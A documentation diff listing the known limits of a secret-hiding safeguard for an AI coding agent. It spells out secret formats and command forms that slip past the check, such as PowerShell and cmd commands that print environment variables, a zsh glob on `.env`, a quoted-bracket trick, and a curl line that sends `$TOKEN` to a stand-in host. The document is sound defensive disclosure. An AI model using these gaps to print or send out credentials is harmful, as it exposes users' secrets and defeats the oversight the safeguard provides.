@@ -45,7 +45,17 @@ Set `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB=1` in the `env` block of `~/.claude/settin
   - a quoted bracket before an open `{` or `(`, as in `{ echo ")" && cat <<'EOF' … } | bash`, because the mod counts brackets without reading quotes
 
   The mod still hides known key formats in the output.
-- Secrets in a format it does not know pass through.
+- Secrets in a format it does not know pass through. Examples:
+  - WireGuard's `PrivateKey = …`, Azure DevOps tokens, and PHP's `define('DB_PASSWORD', '…')`
+  - a `Cookie:` header outside a HAR file
+  - a Kubernetes Secret `data:` value whose key is not named like a secret (`tls.key`, `.dockerconfigjson`)
+  - a password shorter than 8 characters, or another secret-named value shorter than 12
+  - an unquoted YAML value with no digit (`password: hunterhunter`)
+  - a Bearer or Basic credential with no `Authorization` header name before it, or shorter than 20 characters
+- A URL credential (`?token=`, `?api_key=`, `X-Amz-Signature=`, `sig=`) is hidden in your messages too. So a signed download link you paste reaches Claude without its signature, and Claude cannot open it. Download the file yourself and give Claude its path.
+- A command that sends a variable, such as `curl "https://api.test/?t=$TOKEN"`, runs. The mod sees only the name, not the value. Env scrubbing (above) is the defense here.
+- Commands are read in shell (sh, bash, zsh) form only. PowerShell and cmd forms that print secrets, such as `echo $env:API_KEY`, `Get-ChildItem Env:` or `cmd /c set`, run. A credential file name in them is still blocked.
+- If a check itself fails, the call is refused. When the tool had already started, it may have run, and only its output is withheld.
 - A connection URL password shorter than 8 characters, or with a raw `/` in it, is not hidden. A percent-encoded `/` (`%2F`) is fine. Dev passwords such as `postgres:postgres@` are hidden, so a shell command that holds one is refused.
 - A name followed by `(` is read as a function call, not a file, so `grep "mock.env(" tests` runs. A zsh glob qualifier on a credential file (`cat .env(N)`) gets through the same way; known key formats in its output are still hidden. Code names such as `process.env`, `import.meta.env` and `c.env` are not files either, but a script that prints the whole environment (`console.log(process.env)`, `print(os.environ)`) is blocked. So is one that prints a secret-named variable in the same statement (`print(os.getenv("API_KEY"))`) in JavaScript, Python or Ruby; a test such as `!process.env.GITHUB_TOKEN` runs, and other languages are not read.
 - `jq` reads its first argument as a filter, so `jq '.env.PATH' settings.json` runs. The files it reads are still checked, including `--rawfile` and `--slurpfile` values, redirects, and the filter file of `-f`. Other tools with a filter argument, such as `yq`, are not read this way. A filter that uses jq's `env` or `$ENV` prints the environment, so it is blocked, `jq -n 'env.HOME'` included.
